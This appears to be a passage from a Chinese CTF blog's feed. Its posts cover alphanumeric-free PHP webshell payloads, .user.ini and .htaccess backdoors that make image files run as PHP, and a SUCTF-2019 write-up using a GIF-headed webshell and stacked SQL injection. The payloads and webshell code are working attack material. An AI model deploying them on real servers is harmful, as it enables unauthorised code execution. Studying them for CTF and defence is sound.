        <content type="html"><![CDATA[<h1 id="特殊的webshell"><a href="#特殊的webshell" class="headerlink" title="特殊的webshell"></a>特殊的webshell</h1><h2 id="不包含数字字母"><a href="#不包含数字字母" class="headerlink" title="不包含数字字母"></a>不包含数字字母</h2><pre><code>&lt;?php@highlight_file(__FILE__);if(!preg_match(&apos;/[a-z0-9]/is&apos;,$_GET[&apos;shell&apos;])) { eval($_GET[&apos;shell&apos;]);}?&gt;</code></pre><h3 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h3><p>异或是对字符的ascii码进行逐位异或以后得到一个异或结果ascii码的字符。第一种方法就是这样来绕过数字字母的检测。</p><pre><code>$a=urldecode(&apos;%01&apos;); //ascii 0x01$b=urldecode(&apos;`&apos;);   //ascii 96echo $a^$b;             //a96:  0110 0000%01: 0000 0001         //相当于ascii+1</code></pre><p>我们统一选取 <strong>‘`’</strong> 作为我们异或的起点，因为他的 ascii 是96。</p><pre><code>$_=(&apos;%01&apos;^&apos;`&apos;).(&apos;%13&apos;^&apos;`&apos;).(&apos;%13&apos;^&apos;`&apos;).(&apos;%05&apos;^&apos;`&apos;).(&apos;%12&apos;^&apos;`&apos;).(&apos;%14&apos;^&apos;`&apos;);$__=&apos;_&apos;.(&apos;%0D&apos;^&apos;]&apos;).(&apos;%2F&apos;^&apos;`&apos;).(&apos;%0E&apos;^&apos;]&apos;).(&apos;%09&apos;^&apos;]&apos;); // $__=&apos;_POST&apos;;$___=$$__;$_($___[_]); // assert($_POST[_]);</code></pre><p>效果如下：</p><h3 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h3><p>通过取反将汉字编码中的编码取出来进行取反</p><pre><code>echo ((&apos;&gt;&apos;&gt;&apos;&lt;&apos;)+(&apos;&gt;&apos;&gt;&apos;&lt;&apos;)).&apos; &apos;;//利用弱类型的特性$__=(&apos;&gt;&apos;&gt;&apos;&lt;&apos;)+(&apos;&gt;&apos;&gt;&apos;&lt;&apos;);$_=$__/$__;echo $_;echo ~(&apos;和&apos;{2});              //s</code></pre><p>payload:</p><pre><code>$__=(&apos;&gt;&apos;&gt;&apos;&lt;&apos;)%2b(&apos;&gt;&apos;&gt;&apos;&lt;&apos;);$_=$__/$__;$____=&apos;&apos;;$___=&quot;瞰&quot;;$____.=~($___{$_});$___=&quot;和&quot;;$____.=~($___{$__});$___=&quot;和&quot;;$____.=~($___{$__});$___=&quot;的&quot;;$____.=~($___{$_});$___=&quot;半&quot;;$____.=~($___{$_});$___=&quot;始&quot;;$____.=~($___{$__});$_____=&apos;_&apos;;$___=&quot;俯&quot;;$_____.=~($___{$__});$___=&quot;瞰&quot;;$_____.=~($___{$__});$___=&quot;次&quot;;$_____.=~($___{$_});$___=&quot;站&quot;;$_____.=~($___{$_});$_=$$_____;$____($_[$__]);</code></pre><p>效果如下：</p><h3 id="字符递增"><a href="#字符递增" class="headerlink" title="字符递增"></a>字符递增</h3><blockquote><p>在处理字符变量的算数运算时，PHP 沿袭了 Perl 的习惯，而非 C 的。例如，在 Perl 中 $a = ‘Z’; $a++; 将把 $a 变成’AA’，而在 C 中，a = ‘Z’; a++; 将把 a 变成 ‘[‘（’Z’ 的 ASCII 值是 90，’[‘ 的 ASCII 值是 91）。注意字符变量只能递增，不能递减，并且只支持纯字母（a-z 和 A-Z）。递增／递减其他字符变量则无效，原字符串没有变化。 </p></blockquote><pre><code>echo &quot;&lt;h3&gt;Postincrement&lt;/h3&gt;&quot;;$a = 5;echo &quot;Should be 5: &quot; . $a++ . &quot;&lt;br /&gt;\n&quot;; //5echo &quot;Should be 6: &quot; . $a . &quot;&lt;br /&gt;\n&quot;;   //6$c = &apos;b&apos;;echo $c++.&quot;&lt;br /&gt;\n&quot;;                     //becho $c.&quot;\n&quot;;                               //c?&gt;</code></pre><p>我们只要拿到一个变量值为 <code>a</code> ，通过自增操作就可以获得 <code>a-z</code> 中所有字符。</p><p>php中如果强制链接数组和字符串的话，数组会被转换成字符串，值为 <code>Arrary</code> </p><pre><code>echo &apos;&apos;.[];   //Array</code></pre><p>我们取第一个字符就可以得到 <code>A</code> 了。</p><p>payload:</p><pre><code>&lt;?php$_=[];$_=@&quot;$_&quot;; // $_=&apos;Array&apos;;$_=$_[&apos;!&apos;==&apos;@&apos;]; // $_=$_[0];$___=$_; // A$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; // S$___.=$__; // S$__=$_;$__++;$__++;$__++;$__++; // E $___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$___.=$__;$____=&apos;_&apos;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$____.=$__;$_=$$____;$___($_[_]); // ASSERT($_POST[_]);</code></pre><h2 id="限制长度"><a href="#限制长度" class="headerlink" title="限制长度"></a>限制长度</h2><p>PHP可以将字符串当作函数来处理：</p><pre><code>function B(){    echo &quot;hello world!&quot;;}$_++;           //1echo $_;$__ = &apos;?&apos;^&apos;}&apos;; //Becho $__;$__();</code></pre><p>题目：</p><pre><code>&lt;?phpinclude &apos;flag.php&apos;;if(isset($_GET[&apos;code&apos;])){    $code = $_GET[&apos;code&apos;];    if(strlen($code)&gt;40){        die(&quot;Long.&quot;);    }    if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code)){        die(&quot;NO.&quot;);    }    @eval($code);}else{    highlight_file(__FILE__);}//$hint =  &quot;php function getFlag() to get flag&quot;;?&gt;</code></pre><p>限制长度为40，之前的异或不行了。我们要利用PHP允许动态执行函数的特点，构造一个 <code>_GET</code> 来去读取 <code>getFlag()</code> </p><p>可以通过连续调用异或来获得 <code>_GET</code> </p><pre><code>&lt;?php    echo &quot;`{{{&quot;^&quot;?&lt;&gt;/&quot;;//_GET?&gt;</code></pre><p>通过构造 <code>${$_}[_](${$_}[__]) //$_GET[_]($_GET[__])</code> 来获取参数</p><p>最后传入参数 getFlag</p><pre><code>?code=$_=&quot;`{{{&quot;^&quot;?&lt;&gt;/&quot;;${$_}[_](${$_}[__]);&amp;_=getFlag </code></pre><p>后面的 <code>__</code> 我们不传值默认为 <code>NULL</code> 也就相当于 <code>getFlag()</code></p><p>事实上下面这也可以：</p><pre><code>?code=$_=&quot;`{{{&quot;^&quot;?&lt;&gt;/&quot;;${$_}[_]();&amp;_=getFlag</code></pre><h3 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h3><pre><code>?code=$_=~%98%9A%8B%B9%93%9E%98;$_();</code></pre><p>对 <code>getFlag</code> 进行取反然后 <code>URL</code> 编码</p><pre><code>?code=%24%7B%7E%22%A0%B8%BA%AB%22%7D%5B%AA%5D%28%29%3B&amp;%aa=getFlag</code></pre><p>这个在{}中进行取反 <code>${~&quot;\xa0\xb8\xba\xab&quot;}</code> ，相当于 <code>$_GET</code>，拼接出了 <code>$_GET[&#39;+&#39;]&amp;#40; &amp;#41;;</code>，传入 <code>+=getFlag()</code> 从而执行了函数`</p><h2 id="不用数字字母和下划线"><a href="#不用数字字母和下划线" class="headerlink" title="不用数字字母和下划线"></a>不用数字字母和下划线</h2><p>题目：</p><pre><code>&lt;?phpinclude &apos;flag.php&apos;;if(isset($_GET[&apos;code&apos;])){    $code = $_GET[&apos;code&apos;];    if(strlen($code)&gt;50){        die(&quot;Too Long.&quot;);    }    if(preg_match(&quot;/[A-Za-z0-9_]+/&quot;,$code)){        die(&quot;Not Allowed.&quot;);    }    @eval($code);}else{    highlight_file(__FILE__);}//$hint =  &quot;php function getFlag() to get flag&quot;;?&gt;  </code></pre><p>通过上面的取反就可以了</p><pre><code>?code=$&amp;#123;%7e%22%A0%B8%BA%AB%22&amp;#125;[%27%2d%27]();&amp;%2d=getFlag //$_GET(&apos;-&apos;)();&amp;-=getFlag;$c = &quot;_GET&quot;;echo urlencode(~($c)); //%A0%B8%BA%AB</code></pre><p>这里利用 <code>${}</code> 中的代码可以执行的特点，在 <code>{}</code> 里进行取反操作，其实也就是可变变量</p><pre><code>&lt;?php    $a = &apos;hello&apos;;    $$a = &apos;world&apos;;    echo &quot;$a ${$a}&quot;;?&gt;输出：hello world</code></pre><p>这里的 <code>$&amp;#123;%7e%22%A0%B8%BA%AB%22&amp;#125;</code> 相当于 <code>$_GET</code> .</p><p>还有更骚的，用中文：</p><pre><code>code=$啊=(%27%5D%40%5C%60%40%40%5D%27^%27%3A%25%28%26%2C%21%3A%27);$啊();  //%27%5D%40%5C%60%40%40%5D%27^%27%3A%25%28%26%2C%21%3A%27=getFlag</code></pre><p>相当于直接给变量赋值了，这样就不用 <code>{}</code> 了</p><h2 id="不用数字、字母、-、"><a href="#不用数字、字母、-、" class="headerlink" title="不用数字、字母、_、$"></a>不用数字、字母、_、$</h2><pre><code>&lt;?php include &apos;flag.php&apos;;if(isset($_GET[&apos;code&apos;])){    $code=$_GET[&apos;code&apos;];    if(strlen($code)&gt;35){    die(&quot;Long.&quot;);    }    if(preg_match(&quot;/[A-Za-z0-9_$]+/&quot;,$code))    {        die(&quot;NO.&quot;);    }    @eval($code);}else{    highlight_file(__FILE__);}//$hint=&quot;php function getFlag() to get flag&quot;;?&gt;</code></pre><p>payload:<br>    ?code=?&gt;<?=`/???/??? ????.???`?></p><p><code>?&gt;</code> 闭合php文件开头的 <code>&lt;?php</code> , <code>&lt;?</code> 相当于 <code>&lt;? echo</code> .</p><p>在配置文件中开启 <code>short_open_tag</code> 后可以使用短标签。默认是开启的。</p><h2 id="another-test"><a href="#another-test" class="headerlink" title="another test"></a>another test</h2><pre><code>&lt;?phphighlight_file(__FILE__);$_ = @$_GET[&apos;_&apos;];if ( preg_match(&apos;/[\x00- 0-9\&apos;&quot;`$&amp;.,|[{_defgops\x7F]+/i&apos;, $_) )    die(&apos;rosé will not do it&apos;);if ( strlen(count_chars(strtolower($_), 0x3)) &gt; 0xd )    die(&apos;you are so close, omg&apos;);eval($_);?&gt;</code></pre><p>主要是记录一下大佬的检测可用函数的脚本：</p><pre><code>&lt;?php $arr = get_defined_functions()[&apos;internal&apos;];foreach ($arr as $key =&gt; $value) {    if ( preg_match(&apos;/[\x00- 0-9\&apos;&quot;`$&amp;.,|[{_defgops\x7F]+/i&apos;, $value) ){        unset($arr[$key]);        continue;    }    if ( strlen(count_chars(strtolower($value), 0x3)) &gt; 0xd ){        unset($arr[$key]);        continue;    }}var_dump($arr);?&gt;</code></pre><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote><p><a href="https://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html" target="_blank" rel="noopener">https://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html</a></p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p><p><a href="https://www.smi1e.top/php%e4%b8%8d%e4%bd%bf%e7%94%a8%e6%95%b0%e5%ad%97%e5%ad%97%e6%af%8d%e5%92%8c%e4%b8%8b%e5%88%92%e7%ba%bf%e5%86%99shell/" target="_blank" rel="noopener">https://www.smi1e.top/php%e4%b8%8d%e4%bd%bf%e7%94%a8%e6%95%b0%e5%ad%97%e5%ad%97%e6%af%8d%e5%92%8c%e4%b8%8b%e5%88%92%e7%ba%bf%e5%86%99shell/</a></p><p><a href="https://xz.aliyun.com/t/5677#toc-3" target="_blank" rel="noopener">https://xz.aliyun.com/t/5677#toc-3</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>两种构成文件后门的方法</title>
      <link href="/2019/09/18/%E4%B8%A4%E7%A7%8D%E6%9E%84%E6%88%90%E6%96%87%E4%BB%B6%E5%90%8E%E9%97%A8%E7%9A%84%E6%96%B9%E6%B3%95/"/>
      <url>/2019/09/18/%E4%B8%A4%E7%A7%8D%E6%9E%84%E6%88%90%E6%96%87%E4%BB%B6%E5%90%8E%E9%97%A8%E7%9A%84%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="两种利用文件构成PHP后门的方法：-htaccess-amp-user-ini"><a href="#两种利用文件构成PHP后门的方法：-htaccess-amp-user-ini" class="headerlink" title="两种利用文件构成PHP后门的方法：.htaccess &amp; .user.ini"></a>两种利用文件构成PHP后门的方法：.htaccess &amp; .user.ini</h1><h2 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h2><p>以下部分摘取于P神的博客<a href="http://www.vuln.cn/6001" title="P神博客" target="_blank" rel="noopener">http://www.vuln.cn/6001</a></p><h3 id="user-ini-是什么？"><a href="#user-ini-是什么？" class="headerlink" title=".user.ini 是什么？"></a>.user.ini 是什么？</h3><p>只要是以fastcgi运行的php都可以用<code>.user.ini</code>构成文件后门的方法。相比于<code>.htaccess</code>有更大的利用空间。 </p><p>我们从php手册可以看到php.ini是php默认的配置文件，这里是配置选项列表<a href="https://www.php.net/manual/zh/ini.list.php" title="配置项列表" target="_blank" rel="noopener">https://www.php.net/manual/zh/ini.list.php</a>  从表中我们可以看到有 <code>PHP_INI_PERDIR</code>、<code>PHP_INI_SYSTEM</code>    、<code>PHP_INI_USER</code>、<code>PHP_INI_ALL</code> 四种模式，那么这四种有什么区别呢？  </p><pre><code>模式                含义PHP_INI_USER    可在用户脚本（例如 ini_set() ）或 Windows 注册表（自 PHP 5.3 起）以及 .user.ini 中设定PHP_INI_PERDIR    可在 php.ini，.htaccess 或 httpd.conf 中设定PHP_INI_SYSTEM    可在 php.ini 或 httpd.conf 中设定PHP_INI_ALL        可在任何地方设定</code></pre><p>这里提到了我们可以自己设置的模式有 <code>PHP_INI_USER</code>、<code>PHP_INI_PERDIR</code>、<code>PHP_INI_ALL</code>。 在这里我们看到了 <code>.user.ini</code> 。翻阅手册<a href="https://www.php.net/manual/zh/configuration.file.per-user.php" title="手册" target="_blank" rel="noopener">https://www.php.net/manual/zh/configuration.file.per-user.php</a>可知：</p><blockquote><p>自 PHP 5.3.0 起，PHP 支持基于每个目录的 .htaccess 风格的 INI 文件。此类文件仅被 CGI／FastCGI SAPI 处理。此功能使得 PECL 的 htscanner 扩展作废。如果使用 Apache，则用 .htaccess 文件有同样效果。</p><p>除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（$_SERVER[‘DOCUMENT_ROOT’] 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。</p><p>在 .user.ini 风格的 INI 文件中只有具有 <strong>PHP_INI_PERDIR</strong> 和 <strong>PHP_INI_USER</strong> 模式的 INI 设置可被识别。</p><p>两个新的 INI 指令，user_ini.filename 和 user_ini.cache_ttl 控制着用户 INI 文件的使用。</p><p>user_ini.filename 设定了 PHP 会在每个目录下搜寻的文件名；如果设定为空字符串则 PHP 不会搜寻。默认值是 .user.ini。</p><p>user_ini.cache_ttl 控制着重新读取用户 INI 文件的间隔时间。默认是 300 秒（5 分钟）。</p></blockquote><p>同时与php.ini不同的是.user.ini是一个能动态加载的配置文件，修改文件内容之后不需要重启中间件只需要等待  <code>user_ini.cache_ttl</code> 时间即可被加载。</p><p>也就是说 <code>.user.ini</code> 其实就是一个我们可以自定义php配置的文件。</p><h3 id="如何利用？"><a href="#如何利用？" class="headerlink" title="如何利用？"></a>如何利用？</h3><p>从php配置列表里我们发现无法配置一些关键的配置，但是在构成文件后门时我们找到了两个我们可以自己配置的选项：</p><p><img src="https://images2015.cnblogs.com/blog/804631/201602/804631-20160212221854714-1902413142.png" alt></p><p><strong>auto_prepend_file</strong></p><blockquote><p>Specifies the name of a file that is automatically parsed before the main file. The file is included as if it was called with the require function, so include_path is used.</p><p>The special value none disables auto-prepending.</p></blockquote><p>指定一个文件在主文件之前自动解析，这个被包含的文件相当于在主文件之前调用了 <code>require</code> 函数，路径受到<code>include_path</code> 限制。 <code>include_path</code> 会指定 <em>require, include, fopen(), file(), readfile() and file_get_contents()</em> 这些函数执行时去哪寻找文件。</p><p><strong>auto_append_file</strong></p><blockquote><p>Specifies the name of a file that is automatically parsed after the main file. The file is included as if it was called with the require function, so include_path is used.</p><p>The special value none disables auto-appending.</p><p>Note: If the script is terminated with exit(), auto-append will not occur.</p></blockquote><p>我们利用的重点是第一个配置，同时我们从文档也可以看出在利用时我们需要一个<strong>正常</strong>的php文件来包含我们的webshell，*<em>也就是说我们只有在文件夹里有可以正常解析(使用fastcgi模式解析)的php文件时才能这样利用。<br>*</em><br>使用时也简单直接写在<code>.user.ini</code>中</p><pre><code>auto_prepend_file=webshell.jpg</code></pre><h3 id="效果如何？"><a href="#效果如何？" class="headerlink" title="效果如何？"></a>效果如何？</h3><p>环境win10+php-5.45-nts+Nginx</p><p>结果如下：</p><p><img src="https://wx3.sinaimg.cn/mw690/006boCb9ly1g7c0otmfxdj313c0f476s.jpg" alt="效果如图"></p><h2 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h2><h3 id="htaccess是什么？"><a href="#htaccess是什么？" class="headerlink" title=".htaccess是什么？"></a>.htaccess是什么？</h3><p>翻阅apaceh官方文档<a href="https://httpd.apache.org/docs/current/howto/htaccess.html" target="_blank" rel="noopener">https://httpd.apache.org/docs/current/howto/htaccess.html</a>可知</p><blockquote><p>.htaccess files provide a way to make configuration changes on a per-directory basis.</p></blockquote><p><code>.htaccess</code> 文件提供了一种目录级别的修改配置的方式。一个文件，包含一条或多条配置指令，放置于目录下，这些配置指令对当前目录和其所有子目录生效。</p><h3 id="SetHandler"><a href="#SetHandler" class="headerlink" title="SetHandler"></a>SetHandler</h3><p>我们在 <code>.htaccess</code> 文件中可以通过增加 <code>handler-name</code> 来配置文件的解析方式。比如你有一个目录，你想让它被 <code>imagemap rule files</code> 解析，你可以在在 <code>.htaccess</code> 文件中加入这段代码：</p><pre><code>SetHandler imap-file</code></pre><p>同样的，<code>AddType</code> 可指示文件管理系统对给出的文件名以选定的文件类型进行解析。</p><pre><code>AddType image/gif .gif</code></pre><p>同时，我们也可以在以 <code>php</code> 作为 <code>Apacec module</code> 时，通过 <code>php_value</code> 来配置PHP的配置选项：</p><pre><code>php_value name value</code></pre><p>设置指定的值. 只适合于 PHP_INI_ALL 和 PHP_INI_PERDIR 类型指令</p><h3 id="如何利用？-1"><a href="#如何利用？-1" class="headerlink" title="如何利用？"></a>如何利用？</h3><p><strong>文件解析上传漏洞</strong></p><p>.htaccess文件中定义了将上传的文件后缀名为 .jpg 格式的文件以 php 格式来解析文件。.htaccess 是apache服务器中的一个配置文件，不是上传的文件的黑名单之内，所以该类型文件可以上传成功。</p><pre><code>AddType  application/x-httpd-php  .jpg</code></pre><p>还可以这样：</p><pre><code># FileMatch 参数即为文件名的正则匹配&lt;FilesMatch &quot;sniperoj&quot;&gt;  SetHandler application/x-httpd-php&lt;/FilesMatch&gt;// sniperoj&lt;?php eval($_GET[&apos;c&apos;]);?&gt;</code></pre><p><strong>文件包含</strong></p><pre><code>index.php: (empty).htaccess:php_value auto_append_file /etc/hosts</code></pre><p><strong>PHP 代码执行</strong></p><pre><code>index.php: (empty).htaccess:php_value auto_append_file .htaccess#&lt;?php phpinfo();</code></pre><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><p><a href="https://httpd.apache.org/docs/current/howto/htaccess.html" target="_blank" rel="noopener">https://httpd.apache.org/docs/current/howto/htaccess.html</a></p><p><a href="http://www.justanotherhacker.com/2011/05/htaccess-based-attacks.html" target="_blank" rel="noopener">http://www.justanotherhacker.com/2011/05/htaccess-based-attacks.html</a></p><p><a href="https://httpd.apache.org/docs/current/mod/mod_authn_core.html#authtype" target="_blank" rel="noopener">https://httpd.apache.org/docs/current/mod/mod_authn_core.html#authtype</a></p><p><a href="https://httpd.apache.org/docs/current/mod/core.html#sethandler" target="_blank" rel="noopener">https://httpd.apache.org/docs/current/mod/core.html#sethandler</a></p><p><a href="https://httpd.apache.org/docs/current/mod/mod_mime.html#addhandler" target="_blank" rel="noopener">https://httpd.apache.org/docs/current/mod/mod_mime.html#addhandler</a></p><p><a href="https://www.php.net/manual/en/configuration.changes.php" target="_blank" rel="noopener">https://www.php.net/manual/en/configuration.changes.php</a></p><p><a href="https://www.cnblogs.com/xia0zhiwei/p/4713438.html" target="_blank" rel="noopener">https://www.cnblogs.com/xia0zhiwei/p/4713438.html</a></p><p><a href="http://www.vuln.cn/6001" target="_blank" rel="noopener">http://www.vuln.cn/6001</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SUCTF-2019</title>
      <link href="/2019/09/10/suctf-2019-WP/"/>
      <url>/2019/09/10/suctf-2019-WP/</url>
      
        <content type="html"><![CDATA[<h1 id="SUCTF-2019-WP"><a href="#SUCTF-2019-WP" class="headerlink" title="SUCTF-2019 WP"></a>SUCTF-2019 WP</h1><p>9/10/2019 6:15:38 PM </p><h2 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h2><p>先上传一个 <code>websell.php</code>，显示后缀不合法(改<code>php5</code>、<code>php4</code>、<code>content-type</code>这些都不行)。</p><p>再上传一个图片马发现显示 <code>&amp;lt;? in contents!</code> ，就是说<code>&lt; ?</code>不能连续存在。</p><p>我们通过<code>&lt;script language=&#39;php&#39;&gt;&lt;/script&gt;</code>来绕过对<code>&lt;?</code>的检测。这次我们得到回显<br>    exif_imagetype:not image!</p><p><code>exif_imagetype</code>用来判断图片类型，他读取一个图像的第一个字节并检查其签名。只要我们添加一个图片头就可以绕过，比如添加<code>GIF89a</code>.在添加完之后我们上传成功，此时的文件目录下除了我们上传的<code>webshell</code>还有一个<code>index.php</code>.</p><h3 id="user-ini-文件构成的后门"><a href="#user-ini-文件构成的后门" class="headerlink" title=".user.ini 文件构成的后门"></a>.user.ini 文件构成的后门</h3><p>详情看p神这篇文章<a href="http://www.vuln.cn/6001" title="点这里" target="_blank" rel="noopener">http://www.vuln.cn/6001</a></p><blockquote><p>除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（$_SERVER[‘DOCUMENT_ROOT’] 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。</p></blockquote><blockquote><p>在 .user.ini 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置可被识别。</p></blockquote><p><code>.user.ini</code>类似一个用户自定义的<code>php.ini</code>。我们能够自定义的设置是”<code>PHP_INI_PERDIR</code> 、 <code>PHP_INI_USER</code>“的设置。（上面表格中没有提到的<code>PHP_INI_PERDIR</code>也可以在<code>.user.ini</code>中设置）</p><p>实际上，除了<code>PHP_INI_SYSTEM</code>以外的模式（包括<code>PHP_INI_ALL</code>）都是可以通过<code>.user.ini</code>来设置的。</p><p>和<code>php.ini</code>不同的是，<code>.user.ini</code>是一个能被动态加载的ini文件。也就是说我修改了<code>.user.ini</code>后，不需要重启服务器中间件，只需要等待<code>user_ini.cache_ttl</code>所设置的时间（默认为300秒），即可被重新加载。</p><p><img src="https://images2015.cnblogs.com/blog/804631/201602/804631-20160212221854714-1902413142.png" alt="php中两个配置"></p><p><code>auto_prepend_file</code> 意味这是在php脚本执行前会执行这个参数设置的脚本，类似于在文件前调用<code>require()</code>然后这个参数的脚本所在目录受<code>include_path</code>限制<br><code>append</code>是在<code>php</code>脚本执行后才执行的，但是要注意的是遇到<code>exit()</code>的时候，这个脚本也不能运行</p><p>使用的时候直接写在<code>.user.ini</code>中</p><pre><code>auto_prepend_file=webshell.gif</code></pre><p>webshell.gif是要包含的文件.所以我们可以借助这个配置项来让所有的php文件都“自动”包含这个文件。👍</p><p>某网站限制不允许上传.php文件，你便可以上传一个.user.ini，再上传一个图片马，包含起来进行getshell。不过前提是含有.user.ini的文件夹下需要有正常的php文件，否则也不能包含了。</p><p>.htaccess文件构成的后门看这里：<a href="https://github.com/sektioneins/pcc/wiki/PHP-htaccess-injection-cheat-sheet" title=".htaccess">https://github.com/sektioneins/pcc/wiki/PHP-htaccess-injection-cheat-sheet</a>这个只能用于Apache</p><p>看到这里我们发现当前目录下确实有<code>index.php</code>可以利用，于是我们开始吧🎈</p><h3 id="开始上传"><a href="#开始上传" class="headerlink" title="开始上传"></a>开始上传</h3><p>我们先构造<code>.user.ini</code>文件</p><pre><code>GIF89aauto_prepend_file=CK.jpg</code></pre><p>然后将其上传</p><p>接着构造图片马<code>CK.jpg</code></p><pre><code>GIF89a&lt;script language=&apos;php&apos;&gt;    system(&apos;cat /flag&apos;);&lt;/script&gt;</code></pre><p>成功上传之后我们访问上传后的页面即可看到flag。</p><h2 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy sql"></a>easy sql</h2><p>存在堆叠注入，测试<code>1;show tables;</code>回显</p><pre><code>Array ( [0] =&gt; 1 ) Array ( [0] =&gt; Flag ) </code></pre><p>测试<code>1;select * from Flag;</code>,flag被过滤了</p><p><code>.index.php.swp</code>存在源码泄露,源码如下  </p><pre><code>&lt;?php    session_start();    include_once &quot;config.php&quot;;    $post = array();    $get = array();    global $MysqlLink;    //GetPara();    $MysqlLink = mysqli_connect(&quot;localhost&quot;,$datauser,$datapass);    if(!$MysqlLink){        die(&quot;Mysql Connect Error!&quot;);    }    $selectDB = mysqli_select_db($MysqlLink,$dataName);    if(!$selectDB){        die(&quot;Choose Database Error!&quot;);    }    foreach ($_POST as $k=&gt;$v){        if(!empty($v)&amp;&amp;is_string($v)){            $post[$k] = trim(addslashes($v));        }    }    foreach ($_GET as $k=&gt;$v){        }    }    //die();    ?&gt;&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;a&gt; Give me your flag, I will tell you if the flag is right. &lt;/ a&gt;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&lt;input type=&quot;text&quot; name=&quot;query&quot;&gt;&lt;input type=&quot;submit&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php    if(isset($post[&apos;query&apos;])){        $BlackList = &quot;prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\&quot;&quot;;        //var_dump(preg_match(&quot;/{$BlackList}/is&quot;,$post[&apos;query&apos;]));        if(preg_match(&quot;/{$BlackList}/is&quot;,$post[&apos;query&apos;])){            //echo $post[&apos;query&apos;];            die(&quot;Nonono.&quot;);        }        if(strlen($post[&apos;query&apos;])&gt;40){            die(&quot;Too long.&quot;);        }        $sql = &quot;select &quot;.$post[&apos;query&apos;].&quot;||flag from Flag&quot;;        mysqli_multi_query($MysqlLink,$sql);        do{            if($res = mysqli_store_result($MysqlLink)){                while($row = mysqli_fetch_row($res)){                    print_r($row);                }            }        }while(@mysqli_next_result($MysqlLink));    }    ?&gt;</code></pre><p>查询语句为：<code>$sql = &quot;select &quot;.$post[&#39;query&#39;].&quot;||flag from Flag&quot;;</code></p><h3 id="logical-OR"><a href="#logical-OR" class="headerlink" title="|| logical OR"></a>|| logical OR</h3><pre><code>mysql&gt; SELECT 1 OR 1;        -&gt; 1mysql&gt; SELECT 1 OR 0;        -&gt; 1mysql&gt; SELECT 0 OR 0;        -&gt; 0mysql&gt; SELECT 0 OR NULL;        -&gt; NULLmysql&gt; SELECT 1 OR NULL;        -&gt; 1</code></pre><blockquote><p>Logical OR. When both operands are non-NULL, the result is 1 if any operand is nonzero, and 0 otherwise. With a NULL operand, the result is 1 if the other operand is nonzero, and NULL otherwise. If both operands are NULL, the result is NULL. </p></blockquote><h3 id="如何做？"><a href="#如何做？" class="headerlink" title="如何做？"></a>如何做？</h3><p>先来看一个msql的配置</p><p><strong>PIPES_AS_CONCAT</strong></p><blockquote><p>Treat || as a string concatenation operator (same as CONCAT()) rather than as a synonym for OR. </p></blockquote><p>如果配置了<code>sql_mode=PIPES_AS_CONCAT</code>，Mysql会把逻辑或当作一个字符串链接函数对待。  </p><p><strong>CONCAT(str1,str2,…)</strong></p><blockquote><p>Returns the string that results from concatenating the arguments. May have one or more arguments. If all arguments are nonbinary strings, the result is a nonbinary string. If the arguments include any binary strings, the result is a binary string. A numeric argument is converted to its equivalent nonbinary string form. </p></blockquote><p><code>CONCAT()</code> returns NULL if any argument is NULL. </p><pre><code>mysql&gt; SELECT CONCAT(&apos;My&apos;, &apos;S&apos;, &apos;QL&apos;);        -&gt; &apos;MySQL&apos;mysql&gt; SELECT CONCAT(&apos;My&apos;, NULL, &apos;QL&apos;);        -&gt; NULLmysql&gt; SELECT CONCAT(14.3);        -&gt; 